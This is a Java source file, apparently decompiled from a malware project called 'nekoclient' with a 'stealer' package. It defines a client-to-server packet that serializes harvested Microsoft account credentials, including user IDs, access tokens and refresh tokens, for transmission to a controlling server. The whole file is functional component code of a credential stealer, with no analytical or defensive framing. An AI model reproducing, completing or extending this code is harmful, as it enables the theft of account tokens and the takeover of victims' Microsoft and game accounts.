package dev.neko.nekoclient.packet.impl.client;

import dev.neko.nekoclient.api.buffer.FriendlyByteBuffer;
import dev.neko.nekoclient.api.buffer.StreamByteBuffer;
import dev.neko.nekoclient.api.stealer.msa.auth.ClientType;
import dev.neko.nekoclient.api.stealer.msa.auth.credentials.MicrosoftCredentials;
import dev.neko.nekoclient.packet.Direction;
import dev.neko.nekoclient.packet.impl.NoncePacket;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class MSAResponsePacket extends NoncePacket {
   private List<MicrosoftCredentials> credentials;

   public MSAResponsePacket(String nonce, List<MicrosoftCredentials> credentials) {
      super(nonce);
      this.credentials = credentials;
   }

   public MSAResponsePacket() {
   }

   @Override
   public void read(FriendlyByteBuffer buffer) throws IOException {
      super.read(buffer);
      this.credentials = new ArrayList<>();
      int length = buffer.getInt();

      for(int i = 0; i < length; ++i) {
         this.credentials
            .add(
               new MicrosoftCredentials(
                  buffer.getString(),
                  buffer.getString(),
                  new ClientType(buffer.getString(), buffer.getString(), buffer.getString()),
                  buffer.getLong(),
                  buffer.getString(),
                  buffer.getLong()
               )
            );
      }
   }

   @Override
   public void write(StreamByteBuffer buffer) throws IOException {
      super.write(buffer);
      buffer.putInt(this.credentials.size());

      for(MicrosoftCredentials credentials : this.credentials) {
         buffer.putString(credentials.getUserId());
         buffer.putString(credentials.getAccessToken());
         buffer.putString(credentials.getClientType().getClientId());
         buffer.putString(credentials.getClientType().getScope());
         buffer.putString(credentials.getClientType().getTokenType());
         buffer.putLong(credentials.getAccessTokenExpiration());
         buffer.putString(credentials.getRefreshToken());
         buffer.putLong(credentials.getRefreshTokenExpiration());
      }
   }

   @Override
   public Direction getDirection() {
      return Direction.CLIENT_TO_SERVER;
   }

   @Override
   public String getName() {
      return "msaresponse";
   }

   public final List<MicrosoftCredentials> getCredentials() {
      return this.credentials;
   }
}
